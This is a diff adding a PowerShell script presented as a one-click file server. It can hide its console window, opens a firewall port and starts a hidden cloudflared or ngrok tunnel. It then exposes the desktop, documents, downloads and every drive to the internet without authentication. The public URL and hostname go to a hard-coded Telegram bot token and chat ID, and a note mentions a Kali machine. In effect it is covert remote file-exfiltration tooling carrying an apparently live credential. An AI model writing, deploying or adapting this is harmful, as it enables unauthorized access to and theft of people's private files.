@@ -1,0 +1,507 @@
+<#
+.SYNOPSIS
+    One-click PowerShell file server with Telegram notification.
+    Run as Administrator.
+
+    Usage:
+    .\server.ps1 -TelegramBotToken "123:abc" -TelegramChatId "12345678"
+    .\server.ps1 -HideWindow -TelegramBotToken "123:abc" -TelegramChatId "12345678"
+#>
+
+param(
+    [string]$NgrokAuthToken = "",
+    [string]$TelegramBotToken = "8739612567:AAHoXjqe494-2sqrbj4J91UfzXqParw0sis",
+    [string]$TelegramChatId = "6525313086",
+    [switch]$HideWindow
+)
+
+# --- HIDE WINDOW IF REQUESTED ---
+if ($HideWindow) {
+    Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Window {
+        [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        const int SW_HIDE = 0;
+        public static void Hide() {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+        }
+    }
+"@
+    [Window]::Hide()
+}
+
+# --- 1. Check Admin ---
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "ERROR: Run this script as Administrator." -ForegroundColor Red
+    Write-Host "Right-click PowerShell -> Run as Administrator"
+    if (-not $HideWindow) { pause }
+    exit
+}
+
+# --- 2. Config ---
+$port = 8080
+$prefix = "http://+:$port/"
+
+# --- 3. Telegram helper ---
+function Send-TelegramMessage($message) {
+    if (-not $TelegramBotToken -or -not $TelegramChatId) { 
+        Write-Host "[!] Telegram skipped: missing token or chat ID" -ForegroundColor DarkYellow
+        return $false 
+    }
+    try {
+        $encoded = [System.Web.HttpUtility]::UrlEncode($message)
+        $url = "https://api.telegram.org/bot$TelegramBotToken/sendMessage?chat_id=$TelegramChatId&text=$encoded"
+        $result = Invoke-RestMethod -Uri $url -Method POST -TimeoutSec 15
+        if ($result.ok) {
+            return $true
+        } else {
+            Write-Host "[!] Telegram API error: $($result.description)" -ForegroundColor Red
+            return $false
+        }
+    } catch {
+        Write-Host "[!] Telegram send failed: $_" -ForegroundColor Red
+        return $false
+    }
+}
+
+# --- 4. Reserve URL ACL ---
+Write-Host "[*] Checking URL reservation..." -ForegroundColor Cyan
+$existing = netsh http show urlacl url=$prefix 2>$null
+if ($existing -match "Reserved URL") {
+    Write-Host "[+] URL already reserved."
+} else {
+    Write-Host "[*] Adding URL reservation..."
+    $user = $env:USERNAME
+    $domain = $env:USERDOMAIN
+    if ($domain -and $domain -ne $env:COMPUTERNAME) {
+        $user = "$domain\$env:USERNAME"
+    }
+    netsh http add urlacl url=$prefix user="$user" | Out-Null
+    Write-Host "[+] URL reserved."
+}
+
+# --- 5. Open Firewall ---
+Write-Host "[*] Checking firewall rule..." -ForegroundColor Cyan
+$rule = Get-NetFirewallRule -DisplayName "PS-FileServer-$port" -ErrorAction SilentlyContinue
+if (-not $rule) {
+    New-NetFirewallRule -DisplayName "PS-FileServer-$port" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null
+    Write-Host "[+] Firewall rule added."
+} else {
+    Write-Host "[+] Firewall rule exists."
+}
+
+# --- 6. Virtual paths ---
+$virtualMap = @{}
+$desktop = [Environment]::GetFolderPath('Desktop')
+$docs = [Environment]::GetFolderPath('MyDocuments')
+$pics = [Environment]::GetFolderPath('MyPictures')
+$vids = [Environment]::GetFolderPath('MyVideos')
+$music = [Environment]::GetFolderPath('MyMusic')
+$downloads = Join-Path $env:USERPROFILE 'Downloads'
+
+if (Test-Path $desktop) { $virtualMap['/desktop'] = $desktop }
+if (Test-Path $docs) { $virtualMap['/documents'] = $docs }
+if (Test-Path $downloads) { $virtualMap['/downloads'] = $downloads }
+if (Test-Path $pics) { $virtualMap['/pictures'] = $pics }
+if (Test-Path $vids) { $virtualMap['/videos'] = $vids }
+if (Test-Path $music) { $virtualMap['/music'] = $music }
+
+# --- 7. Tunnel Functions ---
+function Start-CloudflaredTunnel {
+    $cfPath = "$env:TEMP\cloudflared.exe"
+    if (-not (Test-Path $cfPath)) {
+        Write-Host "[*] Downloading cloudflared..." -ForegroundColor Cyan
+        $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
+        $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-$arch.exe"
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $cfPath -UseBasicParsing
+            Write-Host "[+] cloudflared downloaded." -ForegroundColor Green
+        } catch {
+            return @{ Success = $false; Reason = "Download failed" }
+        }
+    }
+    Remove-Item "$env:TEMP\cf.err" -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\cf.log" -ErrorAction SilentlyContinue
+    Write-Host "[*] Starting cloudflared tunnel..." -ForegroundColor Cyan
+    $proc = Start-Process -FilePath $cfPath -ArgumentList "tunnel","--url","http://localhost:$port" -PassThru -WindowStyle Hidden -RedirectStandardOutput "$env:TEMP\cf.log" -RedirectStandardError "$env:TEMP\cf.err"
+    for ($i = 0; $i -lt 25; $i++) {
+        Start-Sleep -Seconds 1
+        if ($proc.HasExited) {
+            $err = Get-Content "$env:TEMP\cf.err" -ErrorAction SilentlyContinue
+            if ($err -match "no such host" -or $err -match "lookup api.trycloudflare.com") {
+                return @{ Success = $false; Reason = "DNS blocked (university firewall)" }
+            }
+            return @{ Success = $false; Reason = "Process exited" }
+        }
+        if (Test-Path "$env:TEMP\cf.err") {
+            $allLines = Get-Content "$env:TEMP\cf.err" -ErrorAction SilentlyContinue
+            $urlMatch = $allLines | Select-String -Pattern "(https://[a-z0-9\-]+\.trycloudflare\.com)" | Select-Object -First 1
+            if ($urlMatch) {
+                return @{ Success = $true; Process = $proc; Url = $urlMatch.Matches.Groups[1].Value }
+            }
+        }
+    }
+    Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+    return @{ Success = $false; Reason = "Timeout" }
+}
+
+function Start-NgrokTunnel {
+    param([string]$Token)
+    if (-not $Token) {
+        return @{ Success = $false; Reason = "No auth token. Get one free at dashboard.ngrok.com" }
+    }
+    $ngrokPath = "$env:TEMP\ngrok.exe"
+    if (-not (Test-Path $ngrokPath)) {
+        Write-Host "[*] Downloading ngrok..." -ForegroundColor Cyan
+        $arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
+        $url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-$arch.zip"
+        try {
+            Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\ngrok.zip" -UseBasicParsing
+            Expand-Archive -Path "$env:TEMP\ngrok.zip" -DestinationPath $env:TEMP -Force
+            Remove-Item "$env:TEMP\ngrok.zip" -ErrorAction SilentlyContinue
+            Write-Host "[+] ngrok downloaded." -ForegroundColor Green
+        } catch {
+            return @{ Success = $false; Reason = "Download failed" }
+        }
+    }
+    & $ngrokPath config add-authtoken $Token 2>$null | Out-Null
+    Write-Host "[*] Starting ngrok tunnel..." -ForegroundColor Cyan
+    $proc = Start-Process -FilePath $ngrokPath -ArgumentList "http","$port" -PassThru -WindowStyle Hidden
+    Start-Sleep -Seconds 5
+    try {
+        $tunnels = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -ErrorAction Stop
+        $url = $tunnels.tunnels[0].public_url
+        return @{ Success = $true; Process = $proc; Url = $url }
+    } catch {
+        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+        return @{ Success = $false; Reason = "ngrok failed to start or blocked" }
+    }
+}
+
+# --- 8. Try Tunnels ---
+$tunnelResult = $null
+$cfResult = Start-CloudflaredTunnel
+if ($cfResult.Success) {
+    $tunnelResult = $cfResult
+    Write-Host "[+] Cloudflared tunnel active!" -ForegroundColor Green
+} else {
+    Write-Host "[!] Cloudflared failed: $($cfResult.Reason)" -ForegroundColor Yellow
+    if ($NgrokAuthToken) {
+        $ngResult = Start-NgrokTunnel -Token $NgrokAuthToken
+        if ($ngResult.Success) {
+            $tunnelResult = $ngResult
+            Write-Host "[+] ngrok tunnel active!" -ForegroundColor Green
+        } else {
+            Write-Host "[!] ngrok failed: $($ngResult.Reason)" -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "[!] Skipping ngrok (no auth token provided)." -ForegroundColor DarkGray
+    }
+}
+
+# --- 9. Display Info ---
+$ips = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
+    $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*"
+} | Select-Object -ExpandProperty IPAddress
+
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Green
+Write-Host "  FILE SERVER READY" -ForegroundColor Green
+Write-Host "========================================" -ForegroundColor Green
+
+if ($tunnelResult) {
+    Write-Host ""
+    Write-Host "  PUBLIC URL (cross-WiFi):" -ForegroundColor Cyan
+    Write-Host "  $($tunnelResult.Url)" -ForegroundColor Yellow
+
+    # --- TELEGRAM NOTIFICATION ---
+    if ($TelegramBotToken -and $TelegramChatId) {
+        Write-Host "[*] Sending URL to Telegram..." -ForegroundColor Cyan
+        $hostname = $env:COMPUTERNAME
+        $msg = "File Server Online" + [char]10 + "Host: $hostname" + [char]10 + "URL: $($tunnelResult.Url)"
+        $sent = Send-TelegramMessage $msg
+        if ($sent) {
+            Write-Host "[+] Telegram notification sent!" -ForegroundColor Green
+        } else {
+            Write-Host "[!] Telegram notification FAILED." -ForegroundColor Red
+            Write-Host "    Check your token and chat ID." -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host ""
+        Write-Host "  [!] No Telegram token/chat ID provided." -ForegroundColor DarkYellow
+        Write-Host "      Run with: -TelegramBotToken '123:abc' -TelegramChatId '12345678'" -ForegroundColor Gray
+    }
+} else {
+    Write-Host ""
+    Write-Host "  TUNNELS BLOCKED by network." -ForegroundColor Red
+    Write-Host "  Use one of these options:" -ForegroundColor Yellow
+    Write-Host ""
+    Write-Host "  1. SAME WIFI:" -ForegroundColor Cyan
+    Write-Host "     Put Kali + this VM on same WiFi," -ForegroundColor Gray
+    Write-Host "     then browse to a LAN URL below." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  2. PHONE HOTSPOT:" -ForegroundColor Cyan
+    Write-Host "     Connect both machines to your" -ForegroundColor Gray
+    Write-Host "     phone hotspot, then use the new LAN IP." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  3. NGROK TOKEN:" -ForegroundColor Cyan
+    Write-Host "     Get free token: dashboard.ngrok.com" -ForegroundColor Gray
+    Write-Host "     Then run: .\server.ps1 -NgrokAuthToken 'YOUR_TOKEN'" -ForegroundColor Gray
+}
+
+Write-Host ""
+Write-Host "  LAN URLs (same network only):" -ForegroundColor Cyan
+foreach ($ip in $ips) {
+    Write-Host "  http://$ip`:$port/" -ForegroundColor Yellow
+}
+Write-Host ""
+Write-Host "  Press Ctrl+C to stop" -ForegroundColor Gray
+Write-Host "========================================" -ForegroundColor Green
+Write-Host ""
+
+# --- 10. Start HTTP Server ---
+$listener = New-Object System.Net.HttpListener
+$listener.Prefixes.Add($prefix)
+try {
+    $listener.Start()
+} catch {
+    Write-Host "[!] Failed to start server: $_" -ForegroundColor Red
+    if ($tunnelResult -and $tunnelResult.Process) { Stop-Process -Id $tunnelResult.Process.Id -Force -ErrorAction SilentlyContinue }
+    if (-not $HideWindow) { pause }
+    exit
+}
+
+function Get-DriveList {
+    return Get-PSDrive -PSProvider FileSystem | Where-Object {
+        $_.Root -and (Test-Path $_.Root)
+    } | ForEach-Object {
+        $free = ""
+        if ($_.Free) { $free = "Free: $([math]::Round($_.Free/1GB,1)) GB" }
+        $label = ""
+        try { $label = (Get-Volume -DriveLetter $_.Name -ErrorAction Stop).FileSystemLabel } catch {}
+        [PSCustomObject]@{
+            Letter = $_.Name
+            Root = $_.Root
+            Label = $label
+            Info = $free
+        }
+    }
+}
+
+function Resolve-TargetPath($urlPath) {
+    foreach ($vkey in $virtualMap.Keys | Sort-Object -Descending) {
+        if ($urlPath -eq $vkey -or $urlPath -like "$vkey/*") {
+            $realBase = $virtualMap[$vkey]
+            $remainder = $urlPath.Substring($vkey.Length) -replace '^/',''
+            if ($remainder) { return Join-Path $realBase $remainder }
+            return $realBase
+        }
+    }
+    if ($urlPath -match '^/drive/([A-Za-z])(?:/(.*))?$') {
+        $drive = $matches[1].ToUpper() + ":\"
+        $sub = ""
+        if ($matches[2]) { $sub = $matches[2] }
+        if ($sub) { return Join-Path $drive $sub }
+        return $drive
+    }
+    $safe = $urlPath -replace '^/',''
+    if ($safe -eq '') { return $null }
+    return Join-Path (Get-Location).Path $safe
+}
+
+function Get-ParentLink($urlPath) {
+    if ($urlPath -eq '/' -or $urlPath -eq '') { return $null }
+    $urlPath = $urlPath.TrimEnd('/')
+    $lastSlash = $urlPath.LastIndexOf('/')
+    if ($lastSlash -le 0) { return '/' }
+    return $urlPath.Substring(0, $lastSlash) + '/'
+}
+
+function ConvertTo-FileLink($name, $urlPath) {
+    $enc = [System.Web.HttpUtility]::UrlEncode($name)
+    if ($urlPath -eq '/') { return "/$enc" }
+    return "$urlPath/$enc".Replace('//','/')
+}
+
+function Get-FileSize($length) {
+    if ($length -gt 1GB) { return "{0:N2} GB" -f ($length/1GB) }
+    if ($length -gt 1MB) { return "{0:N2} MB" -f ($length/1MB) }
+    if ($length -gt 1KB) { return "{0:N2} KB" -f ($length/1KB) }
+    return "$length B"
+}
+
+# --- 11. Main Loop ---
+while ($listener.IsListening) {
+    $context = $null
+    $response = $null
+    try {
+        $context = $listener.GetContext()
+        $request = $context.Request
+        $response = $context.Response
+        $urlPath = $request.Url.LocalPath
+
+        # ROOT DASHBOARD
+        if ($urlPath -eq '/' -or $urlPath -eq '') {
+            $drives = Get-DriveList
+            $specialHtml = ""
+            foreach ($item in $virtualMap.GetEnumerator() | Sort-Object Key) {
+                $name = $item.Key.TrimStart('/')
+                $name = (Get-Culture).TextInfo.ToTitleCase($name)
+                $specialHtml += "<a href='" + $item.Key + "/' class='card special'><div class='title'>" + $name + "</div><div class='path'>" + $item.Value + "</div></a>`n"
+            }
+            $drivesHtml = ""
+            foreach ($drv in $drives) {
+                $label = ""
+                if ($drv.Label) { $label = " (" + $drv.Label + ")" }
+                $drivesHtml += "<a href='/drive/" + $drv.Letter + "/' class='card drive'><div class='title'>" + $drv.Letter + ":" + $label + "</div><div class='path'>" + $drv.Root + " - " + $drv.Info + "</div></a>`n"
+            }
+            $pubBanner = ""
+            if ($tunnelResult) {
+                $pubBanner = "<div class='pub'>Public: " + $tunnelResult.Url + "</div>"
+            }
+            $html = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>My Computer</title>'
+            $html += '<style>'
+            $html += 'body{font-family:Segoe UI,Arial,sans-serif;background:#0d1117;color:#c9d1d9;margin:0;padding:30px}'
+            $html += 'h1{color:#58a6ff;margin-bottom:10px}'
+            $html += 'h2{color:#8b949e;font-size:14px;text-transform:uppercase;letter-spacing:1px;margin-top:30px;margin-bottom:15px;border-bottom:1px solid #30363d;padding-bottom:8px}'
+            $html += '.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:15px;max-width:1200px}'
+            $html += '.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:20px;text-decoration:none;color:inherit;transition:transform .15s,border-color .15s;display:flex;flex-direction:column;align-items:center;text-align:center}'
+            $html += '.card:hover{transform:translateY(-3px);border-color:#58a6ff}'
+            $html += '.card.special{border-left:4px solid #238636}'
+            $html += '.card.drive{border-left:4px solid #1f6feb}'
+            $html += '.title{font-size:16px;font-weight:600;color:#e6edf3;margin-bottom:5px}'
+            $html += '.path{font-size:11px;color:#8b949e;word-break:break-all}'
+            $html += '.pub{background:#238636;color:#fff;padding:10px 20px;border-radius:6px;display:inline-block;margin-bottom:20px;font-family:monospace}'
+            $html += '.footer{margin-top:40px;font-size:12px;color:#484f58}'
+            $html += '</style></head><body>'
+            $html += '<h1>My Computer - ' + $env:COMPUTERNAME + '</h1>'
+            $html += $pubBanner
+            $html += '<h2>Quick Access</h2><div class="grid">' + $specialHtml + '</div>'
+            $html += '<h2>Drives and USB Devices</h2><div class="grid">' + $drivesHtml + '</div>'
+            $html += '<div class="footer">PowerShell File Server | Port ' + $port + '</div>'
+            $html += '</body></html>'
+
+            $buffer = [Text.Encoding]::UTF8.GetBytes($html)
+            $response.ContentType = "text/html; charset=utf-8"
+            $response.ContentLength64 = $buffer.Length
+            $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            $response.OutputStream.Close()
+            continue
+        }
+
+        # FILE BROWSER
+        $targetPath = Resolve-TargetPath $urlPath
+        if (-not $targetPath -or -not (Test-Path $targetPath)) {
+            $response.StatusCode = 404
+            $buffer = [Text.Encoding]::UTF8.GetBytes("404 Not Found")
+            $response.ContentLength64 = $buffer.Length
+            $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            $response.OutputStream.Close()
+            continue
+        }
+
+        $targetPath = (Resolve-Path $targetPath).Path
+
+        if (Test-Path $targetPath -PathType Container) {
+            $items = Get-ChildItem $targetPath -ErrorAction SilentlyContinue | ForEach-Object {
+                [PSCustomObject]@{
+                    Name = $_.Name
+                    Size = if ($_.PSIsContainer) { "-" } else { Get-FileSize $_.Length }
+                    Modified = $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm")
+                    Type = if ($_.PSIsContainer) { "DIR" } else { "FILE" }
+                }
+            } | Sort-Object @{Expression={$_.Type -eq "DIR"}; Descending=$true}, Name
+
+            $parent = Get-ParentLink $urlPath
+            $parentRow = ""
+            if ($parent) {
+                $parentRow = "<tr><td colspan='4'><a href='" + $parent + "'>.. (parent directory)</a></td></tr>"
+            }
+
+            $rows = ""
+            foreach ($item in $items) {
+                $link = ConvertTo-FileLink $item.Name $urlPath
+                $encName = [System.Web.HttpUtility]::HtmlEncode($item.Name)
+                $css = "file"
+                $icon = "FILE"
+                if ($item.Type -eq "DIR") { $css = "dir"; $icon = "DIR" }
+                $rows += "<tr><td><a href='" + $link + "' class='" + $css + "'>" + $icon + " " + $encName + "</a></td><td class='size'>" + $item.Size + "</td><td>" + $item.Modified + "</td><td>" + $item.Type + "</td></tr>`n"
+            }
+
+            $pubBanner = ""
+            if ($tunnelResult) {
+                $pubBanner = "<div class='pub'>Public: " + $tunnelResult.Url + "</div>"
+            }
+
+            $html = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Index of ' + $urlPath + '</title>'
+            $html += '<style>'
+            $html += 'body{font-family:Segoe UI,Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}'
+            $html += 'h1{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:10px;font-size:20px}'
+            $html += '.breadcrumb{font-size:12px;color:#8b949e;margin-bottom:20px}'
+            $html += '.breadcrumb a{color:#58a6ff;text-decoration:none}'
+            $html += 'table{border-collapse:collapse;width:100%;max-width:1000px}'
+            $html += 'th,td{text-align:left;padding:10px 14px;border-bottom:1px solid #21262d}'
+            $html += 'th{color:#8b949e;background:#161b22;font-size:12px;text-transform:uppercase}'
+            $html += 'tr:hover{background:#161b22}'
+            $html += 'a{color:#c9d1d9;text-decoration:none}'
+            $html += 'a:hover{text-decoration:underline}'
+            $html += 'a.dir{color:#58a6ff;font-weight:500}'
+            $html += 'a.file{color:#c9d1d9}'
+            $html += '.size{text-align:right;width:100px}'
+            $html += '.pub{background:#1f6feb;color:#fff;padding:8px 15px;border-radius:5px;margin-bottom:20px;font-family:monospace;font-size:13px}'
+            $html += '</style></head><body>'
+            $html += $pubBanner
+            $html += '<div class="breadcrumb"><a href="/">My Computer</a> &gt; ' + $urlPath + '</div>'
+            $html += '<h1>Index of ' + $urlPath + '</h1>'
+            $html += '<table><tr><th>Name</th><th class="size">Size</th><th>Modified</th><th>Type</th></tr>'
+            $html += $parentRow
+            $html += $rows
+            $html += '</table></body></html>'
+
+            $buffer = [Text.Encoding]::UTF8.GetBytes($html)
+            $response.ContentType = "text/html; charset=utf-8"
+            $response.ContentLength64 = $buffer.Length
+            $response.OutputStream.Write($buffer, 0, $buffer.Length)
+
+        } elseif (Test-Path $targetPath -PathType Leaf) {
+            $buffer = [IO.File]::ReadAllBytes($targetPath)
+            $ext = [IO.Path]::GetExtension($targetPath).ToLower()
+            $mime = @{
+                ".html"="text/html"; ".htm"="text/html"; ".txt"="text/plain"
+                ".jpg"="image/jpeg"; ".jpeg"="image/jpeg"; ".png"="image/png"
+                ".gif"="image/gif"; ".pdf"="application/pdf"; ".css"="text/css"
+                ".js"="application/javascript"; ".json"="application/json"
+                ".xml"="application/xml"; ".zip"="application/zip"
+                ".mp4"="video/mp4"; ".mp3"="audio/mpeg"; ".wav"="audio/wav"
+            }
+            $response.ContentType = $mime[$ext]
+            if (-not $response.ContentType) { $response.ContentType = "application/octet-stream" }
+            $response.ContentLength64 = $buffer.Length
+            $response.OutputStream.Write($buffer, 0, $buffer.Length)
+        } else {
+            $response.StatusCode = 404
+            $buffer = [Text.Encoding]::UTF8.GetBytes("404 Not Found")
+            $response.ContentLength64 = $buffer.Length
+            $response.OutputStream.Write($buffer, 0, $buffer.Length)
+        }
+
+    } catch [System.Net.HttpListenerException] {
+        break
+    } catch {
+        Write-Host "Request error: $_" -ForegroundColor DarkYellow
+    } finally {
+        if ($response) { $response.OutputStream.Close() }
+    }
+}
+
+# Cleanup
+$listener.Stop()
+if ($tunnelResult -and $tunnelResult.Process) {
+    Stop-Process -Id $tunnelResult.Process.Id -Force -ErrorAction SilentlyContinue
+    Write-Host "Tunnel stopped." -ForegroundColor Cyan
+}
+Write-Host "Server stopped." -ForegroundColor Cyan
